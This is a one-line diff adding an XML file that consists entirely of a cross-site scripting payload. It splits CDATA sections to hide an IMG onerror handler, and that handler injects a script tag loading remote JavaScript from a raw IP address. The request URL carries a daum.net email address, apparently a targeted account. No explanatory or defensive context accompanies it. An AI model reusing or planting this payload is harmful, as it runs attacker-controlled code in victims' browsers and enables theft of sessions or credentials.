@@ -1,0 +1,1 @@
+<xml><![CDATA[<IMG width=1 height=1 src="d"onerror]]><![CDATA[]]>=<![CDATA["var x=document.createElement('script');x.src='http://121.127.225.44/flash/daum_js.php?yyuser=whereonpoint@daum.net';top.document.body.appendChild(x);">]]></xml>
